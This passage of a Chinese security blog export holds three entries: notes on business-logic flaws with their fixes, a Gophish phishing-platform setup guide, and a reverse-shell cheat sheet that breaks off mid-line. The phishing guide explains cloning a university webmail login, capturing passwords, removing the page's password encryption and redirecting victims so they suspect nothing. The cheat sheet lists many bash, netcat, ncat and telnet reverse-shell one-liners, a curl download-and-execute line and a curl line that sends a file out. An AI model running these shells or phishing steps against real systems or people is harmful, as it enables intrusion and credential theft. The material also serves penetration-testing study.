<h3 id="Session劫持"><a href="#Session劫持" class="headerlink" title="Session劫持"></a>Session劫持</h3><ul>
<li><p>漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人</p>
</li>
<li><p>漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息</p>
</li>
<li><p>漏洞点：在GET方法请求登录时候带有session值</p>
</li>
<li><p>修复思路：只要避免在URL中带入session信息即可比较有效的防御另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复</p>
</li>
</ul>
<h3 id="密文对比认证"><a href="#密文对比认证" class="headerlink" title="密文对比认证"></a>密文对比认证</h3><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul>
<li><p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举</p>
</li>
<li><p>漏洞点：系统登录点</p>
</li>
<li><p>漏洞修复： 对于固定用户名爆破密码可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码但是不能永久锁定，可能被用来进行账户恶意锁定对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
</li>
</ul>
<h2 id="业务"><a href="#业务" class="headerlink" title="业务"></a>业务</h2><h3 id="订单ID"><a href="#订单ID" class="headerlink" title="订单ID"></a>订单ID</h3><h3 id="用户ID"><a href="#用户ID" class="headerlink" title="用户ID"></a>用户ID</h3><ul>
<li>在支付当中会出现当前用户的ID，比如：username=XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</li>
</ul>
<h3 id="订单号码"><a href="#订单号码" class="headerlink" title="订单号码"></a>订单号码</h3><h3 id="商品ID"><a href="#商品ID" class="headerlink" title="商品ID"></a>商品ID</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul>
<li><p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作</p>
</li>
<li><p>漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举 </p>
</li>
<li><p>漏洞点：系统登录点</p>
</li>
<li><p>漏洞修复： 对于固定用户名爆破密码可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码但是不能永久锁定，可能被用来进行账户恶意锁定对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
</li>
</ul>
<h3 id="绕过验证"><a href="#绕过验证" class="headerlink" title="绕过验证"></a>绕过验证</h3><ul>
<li><p>漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果</p>
</li>
<li><p>漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付</p>
</li>
<li><p>漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中</p>
</li>
<li><p>漏洞修复：在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户</p>
</li>
</ul>
<h3 id="自动识别"><a href="#自动识别" class="headerlink" title="自动识别"></a>自动识别</h3><h3 id="图形验证码绕过"><a href="#图形验证码绕过" class="headerlink" title="图形验证码绕过"></a>图形验证码绕过</h3><ul>
<li><p>漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击</p>
</li>
<li><p>漏洞原理：图形验证码在错误后未失效返回验证码信息分步验证验证码</p>
</li>
<li><p>漏洞点：任何存在图形验证码的功能中</p>
</li>
<li><p>漏洞修复一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码验证码只需要返回图片，切勿将生成验证码的字符串也一并返回验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误</p>
</li>
</ul>
<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><h3 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h3><ul>
<li>在支付当中，购买商品一般分为三步骤：订购、确认信息、付款。那么这个修改价格具体是修改哪一步时的价格呢？可以在这三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</li>
</ul>
<h3 id="数量篡改"><a href="#数量篡改" class="headerlink" title="数量篡改"></a>数量篡改</h3><ul>
<li>在支付的过程中，数量也同时决定着价格，比如：1个数量商品对应的是100，2个数据就是200，那么当你修改这个值数量值为负数时，那么其金额也会变为负数，最后就会导致支付问题的产生。</li>
</ul>
<h3 id="请求重放"><a href="#请求重放" class="headerlink" title="请求重放"></a>请求重放</h3><ul>
<li><p>漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等</p>
</li>
<li><p>漏洞原理：后台未进行相关操作的技术导致数据包重放</p>
</li>
<li><p>漏洞点：短信验证码、邮件校验、提交订单等功能。</p>
</li>
<li><p>修复方案：修复思路（针对短信、邮件）构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数只要某个邮箱或者电话号码次数够了，就不能继续发送了或者计算两次发送的时间间隔，时间过短就不继续发送了通用修复方案需要建立token机制或验证码机制，一次有效</p>
</li>
</ul>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><h2 id="找回机制"><a href="#找回机制" class="headerlink" title="找回机制"></a>找回机制</h2><h3 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h3><h3 id="Response状态值"><a href="#Response状态值" class="headerlink" title="Response状态值"></a>Response状态值</h3><h3 id="Session覆盖"><a href="#Session覆盖" class="headerlink" title="Session覆盖"></a>Session覆盖</h3><h3 id="弱Token缺陷"><a href="#弱Token缺陷" class="headerlink" title="弱Token缺陷"></a>弱Token缺陷</h3><ul>
<li>token可爆破</li>
</ul>
<h3 id="找回流程绕过"><a href="#找回流程绕过" class="headerlink" title="找回流程绕过"></a>找回流程绕过</h3><ul>
<li>通过两个不同账号的找回，获得验证码之后部分的数据包，而另一个账号找回密码时跳过验证码的部分直接进入成功验证之后的部分，等</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="调用遍历"><a href="#调用遍历" class="headerlink" title="调用遍历"></a>调用遍历</h3><h3 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h3><ul>
<li><p>漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利</p>
</li>
<li><p>漏洞原理：没有对传输数据添加相关的校验参数后台未对参数值进行校验并直接使用数据包中的参数</p>
</li>
<li><p>漏洞点：抽奖、购买、转账、返现等功能</p>
</li>
<li><p>漏洞修复：对于软件来说，需要保护好内存数据，防止内存数据篡改计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）</p>
</li>
</ul>
<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><ul>
<li><p>漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能</p>
</li>
<li><p>形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷</p>
</li>
<li><p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在</p>
</li>
<li><p>漏洞修复：J2EE中存在filter，可以获取用户的cookie等信息修复思路：建立LoginList，值是当前在线用户的id对所有需要登录访问到URL，获取请求request再利用 getAttribute(“userid”) 获取其userid检查userid是否存在于LoginList中，不存在则直接返回错误跳转值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息</p>
</li>
</ul>
<h3 id="Webservice测试"><a href="#Webservice测试" class="headerlink" title="Webservice测试"></a>Webservice测试</h3><h3 id="callback自定义"><a href="#callback自定义" class="headerlink" title="callback自定义"></a>callback自定义</h3><h2 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h2><ul>
<li><h3 id="回退重放"><a href="#回退重放" class="headerlink" title="回退重放"></a>回退重放</h3></li>
</ul>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
<li><p>漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效</p>
</li>
<li><p>漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞</p>
</li>
<li><p>漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p>
</li>
<li><p>漏洞修复：修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程并不是每个条件竞争都必须修复</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>钓鱼平台搭建</title>
    <url>/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="1、在github上下载Gophish"><a href="#1、在github上下载Gophish" class="headerlink" title="1、在github上下载Gophish"></a>1、在github上下载Gophish</h4><p><a href="https://github.com/gophish/gophish/releases">https://github.com/gophish/gophish/releases</a></p>
<span id="more"></span>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672753949916-d68c7f5e-6204-4d61-8210-ab0d620c69a9.png" alt="img"></p>
<h4 id="2、解压并安装"><a href="#2、解压并安装" class="headerlink" title="2、解压并安装"></a>2、解压并安装</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mkdir</span>  gophish</span><br><span class="line"></span><br><span class="line"><span class="attribute">unzip</span> gophish-v<span class="number">0</span>.<span class="number">12</span>.<span class="number">1</span>-linux-<span class="number">64</span>bit.zip -d ./gophish</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756110888-41061e50-4887-44c4-9f51-59cc35a4c361.png" alt="img"></p>
<h4 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">config</span>.<span class="keyword">json</span></span><br><span class="line"><span class="keyword"></span>蒋<span class="string">&quot;listen_url&quot;</span>: <span class="string">&quot;127.0.0.1:3333&quot;</span>，修改为<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">443</span>(端口任意)</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756169833-902d24e3-e141-40ed-bcb9-1b5b8550baa6.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756203040-fead3079-a741-4dd2-93c0-ac29ec76c178.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756265682-85a6230c-5357-4f0c-961c-1d4a83fd2c40.png" alt="img"></p>
<p>赋权</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">chmod +<span class="keyword">x</span> gophish</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756401245-b1303864-4282-4a93-8076-ad3ca6653b47.png" alt="img"></p>
<h4 id="4、启动gophish"><a href="#4、启动gophish" class="headerlink" title="4、启动gophish"></a>4、启动gophish</h4><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./gophish</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672756787591-6fcb150d-591b-4806-a3b5-12e0a0e12aa6.png" alt="img"></p>
<p>报错解决方法：</p>
<p><a href="https://blog.csdn.net/NinjaKilling/article/details/125979091">https://blog.csdn.net/NinjaKilling/article/details/125979091</a></p>
<h4 id="5、登录"><a href="#5、登录" class="headerlink" title="5、登录"></a>5、登录</h4><p>密码为<strong>控制台输出的随机密码</strong>，第一次登录后修改密码</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672814086488-af26b838-71df-4802-b972-b0253658489c.png" alt="img"></p>
<h4 id="6、基本配置"><a href="#6、基本配置" class="headerlink" title="6、基本配置"></a>6、基本配置</h4><p>Sending Profiles</p>
<p>配置用来发送钓鱼邮件的邮箱</p>
<p>Name：发件人策略名字(只是该条配置的名字)</p>
<p>From：发件人(受害者收到邮件看到的发件人)</p>
<p>Host：邮件服务器地址</p>
<p>Username：邮箱用户名</p>
<p>Password：邮箱密码</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672816632662-d948a674-14fe-4208-98da-a9895503a7b4.png" alt="img"></p>
<p>Email Headers:<br>    Email Headers 是自定义邮件头字段，例如邮件头的X-Mailer字段，若不修改此字段的值，通过gophish发出的邮件，其邮件头的X-Mailer的值默认为gophish</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672820699054-6e9118dd-1ebc-4507-8adb-c295af1fd4fa.png" alt="img"></p>
<p>配置完成可以发送一封测试邮件查看是否正常</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672816710023-ac3b8ca6-c14d-4d4c-9c6c-422b1c4b340b.png" alt="img"></p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672816655974-a92fe1ca-3037-4770-9ffc-7cf7d403f013.png" alt="img"></p>
<h4 id="7、Email-Templates"><a href="#7、Email-Templates" class="headerlink" title="7、Email Templates"></a>7、Email Templates</h4><p>配置邮件发送的模板</p>
<p>Name：模板名称</p>
<p>Import Mail：导入一个邮件模板，使用邮件的原始文本，形式如下</p>
<p>Change Links to Point to Landing Page：勾选该框，会将邮件中的所有链接自动转变为钓鱼网站的URL(Landing Pages处配置的URL)。</p>
<p>Subject：邮件主题</p>
<p>收件显示的该部分</p>
<p>模板主体</p>
<p>可以使用Text或HTML</p>
<p>Add Tracking Image：在钓鱼邮件末添加一个跟踪图像，用来跟踪受害用户是否打开了收到的钓鱼邮件。</p>
<p>Add Files：添加邮件中的附件</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672817141629-19826fc8-b03f-469e-b5b3-4aa2d577776e.png" alt="img"></p>
<h4 id="8、Users-amp-Groups"><a href="#8、Users-amp-Groups" class="headerlink" title="8、Users &amp; Groups"></a>8、Users &amp; Groups</h4><p>配置钓鱼对象，用户和组</p>
<p>批量导入用户</p>
<p>导入邮箱可以使用CSV进行批量添加，格式如下(可点击Download CSV TEmplate获取模板)</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672817383237-d325296b-9402-4382-9344-dd1199a5673f.png" alt="img"></p>
<h4 id="9、Landing-Pages"><a href="#9、Landing-Pages" class="headerlink" title="9、Landing Pages"></a>9、Landing Pages</h4><p>配置钓鱼页面</p>
<p>Landing Pages是邮件模板中URL指向的页面(如果不想使用钓鱼页面，在配置Email Templates，Import Emails时，不勾选Change Links to Point to Landing Page)</p>
<p>与钓鱼邮件模板的编辑一样，gophish为钓鱼页面的设计也提供了两种方式，第一种则是Import Site 点击Import Site后，填写被伪造网站的URL，再点击Import，即可通过互联网自动抓取被伪造网站的前端代码 这里以伪造XX大学电子邮箱登录界面为例，在Import Site中填写<a href="https://mail.xx.edu.cn,并点击import./">https://mail.XX.edu.cn，并点击import。</a></p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672817615474-5988c220-7a72-47f3-9c90-7946064126ae.png" alt="img"></p>
<p>Import完成后，会自动抓取前端代码</p>
<p>同时，勾选Capture Submitted Data、Capture Passwords</p>
<p>在Redirect to处，可以填写邮件系统的地址，受害者输入用户名密码后，会自动跳转到电子邮件系统，减少受害者的可疑心，形成一个攻击闭环。</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672817817024-ee17eaed-2ad7-43a6-860d-e34f8ec322d1.png" alt="img"></p>
<h4 id="10、钓鱼页面的坑"><a href="#10、钓鱼页面的坑" class="headerlink" title="10、钓鱼页面的坑"></a>10、钓鱼页面的坑</h4><p><strong>捕获不到提交的数据</strong></p>
<p>1、导入后要在HTML编辑框的非Source模式下观察源码解析情况，如果明显发现存在许多地方未加载，则有可能导入的源码并非页面完全加载后的前端代码，而是一个半成品，需要通过浏览器二次解析，渲染未加载的DOM。这种情况下，除非能够直接爬取页面完全加载后的前端代码，否则无法利用gophish进行钓鱼，造成的原因是不满足第2点。</p>
<p>2、导入的前端源码，必须存在严格存在结构</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="function"><span class="keyword">method</span>=&quot;<span class="title">post</span>&quot; ···&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">aaa</span>&quot; ··· /&gt; ··· &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; ··· /&gt;&lt;/<span class="title">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>即表单（POST方式）— Input标签（具有name属性）Input标签（submit类型）— 表单闭合的结构，如果不满足则无法捕获到提交的数据</p>
<p>3、在满足第2点的结构的情况下，还需要求&lt;form method=”post” ···&gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。否则将会把表单数据提交给action指定的页面，而导致无法被捕获到.</p>
<p><strong>捕获数据不齐全</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">对于需要被捕获的表单数据，除了<span class="keyword">input</span>标签需要被包含在&lt;form&gt;中，还需满足该&lt;<span class="keyword">input</span>&gt;存在<span class="type">name</span>属性。例如&lt;<span class="keyword">input</span> <span class="type">name</span>=&quot;username&quot;&gt;,否则会因为没有字段名而导致<span class="keyword">value</span>被忽略。</span><br></pre></td></tr></table></figure>

<p><strong>密码被加密</strong></p>
<p>针对https页面的import，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密。</p>
<h4 id="11、Campaigns"><a href="#11、Campaigns" class="headerlink" title="11、Campaigns"></a>11、Campaigns</h4><p>发起钓鱼行动</p>
<p>Name：钓鱼行动名称</p>
<p>Email Template：选用的钓鱼邮件模板</p>
<p>Landing Page：选用的钓鱼页面</p>
<p>URL：为Gophish服务器搭建时配置的监听地址，默认是gophish服务器80端口，<strong>如果钓鱼服务器和Gophish同服务器，则填127.0.0.1</strong></p>
<p>Sending Profile：选用的发件人信息</p>
<p>Groups：选用的目标组</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672818188158-aafa66f6-6ec0-4f96-9516-1a5eb615c3d3.png" alt="img"></p>
<h4 id="12、Dashboard"><a href="#12、Dashboard" class="headerlink" title="12、Dashboard"></a>12、Dashboard</h4><p>用于查看钓鱼行动的进展</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672818331165-8d1b435b-263c-4ab9-a0fd-3a237c62f1fc.png" alt="img"></p>
<p>在Recent Campaigns可以查看钓鱼行动的详情</p>
<p>可以看到发送成功的邮件、打开邮件的情况、点击链接的情况、提交数据的情况</p>
<p><img src="https://ax-x.github.io/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/1672818370370-37169451-e1a3-49db-8d9d-8fc585da8bab.png" alt="img"></p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>钓鱼平台搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell合集</title>
    <url>/2022/05/13/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>假设本机地址10.10.10.11，监听端口443。</p>
<h2 id="Bash环境下反弹TCP协议shell"><a href="#Bash环境下反弹TCP协议shell" class="headerlink" title="Bash环境下反弹TCP协议shell"></a>Bash环境下反弹TCP协议shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>然后在靶机上执行如下命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/bin/</span>bash -i &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">0</span>&lt;&amp; <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">exec <span class="number">5</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done</span><br><span class="line"></span><br><span class="line">exec <span class="regexp">/bin/</span>sh <span class="number">0</span>&lt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span> <span class="number">1</span>&gt;&amp;<span class="number">0</span> <span class="number">2</span>&gt;&amp;<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>&lt;&amp;<span class="number">196</span>;exec <span class="number">196</span>&lt;&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/10.10.10.11/</span><span class="number">443</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>

<h2 id="Bash环境下反弹UDP协议shell"><a href="#Bash环境下反弹UDP协议shell" class="headerlink" title="Bash环境下反弹UDP协议shell:"></a>Bash环境下反弹UDP协议shell:</h2><p>首先在本地监听UDP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -u -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sh</span> -i &gt;&amp; /dev/udp/<span class="number">10.10.10.11</span>/<span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="使用Netcat反弹shell"><a href="#使用Netcat反弹shell" class="headerlink" title="使用Netcat反弹shell"></a>使用Netcat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/sh <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -c bash <span class="number">10.10.10.11</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">mknod</span> backpipe p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;backpipe | /bin/bash <span class="number">1</span>&gt;backpipe </span><br><span class="line"><span class="attribute">rm</span> /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt;/tmp/f</span><br><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; nc <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>&lt;x | /bin/bash <span class="number">1</span>&gt;x</span><br></pre></td></tr></table></figure>

<h2 id="使用Ncat反弹shell"><a href="#使用Ncat反弹shell" class="headerlink" title="使用Ncat反弹shell"></a>使用Ncat反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ncat</span> <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br><span class="line"><span class="attribute">ncat</span> --udp <span class="number">10.10.10.11</span> <span class="number">443</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="利用curl反弹shell"><a href="#利用curl反弹shell" class="headerlink" title="利用curl反弹shell"></a>利用curl反弹shell</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.20.151/</span><span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">curl http:<span class="regexp">//</span><span class="number">174.1</span>.<span class="number">73.154</span>/shell.txt|bash</span><br></pre></td></tr></table></figure>

<p>PS：OOB的时候可以</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> <span class="number">174.2.171.201:6666</span> -d @/flag</span><br></pre></td></tr></table></figure>

<p>加<code>@</code>表示文件</p>
<h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rm</span> -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span class="number">0</span>/tmp/p <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="attribute">telnet</span> <span class="number">10.10.10.11</span> <span class="number">443</span> | /bin/bash | telnet <span class="number">10.10.10.11</span> <span class="number">444</span></span><br><span class="line"><span class="attribute">rm</span> f;mkfifo f;cat f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|telnet <span class="number">10.10.10.11</span> <span class="number">443</span> &gt; f</span><br><span class="line"><span class="attribute">rm</span> -f x; mknod x p &amp;&amp; telnet <span class="number">10.10.10.11</span> <span class="number">443</span> <span 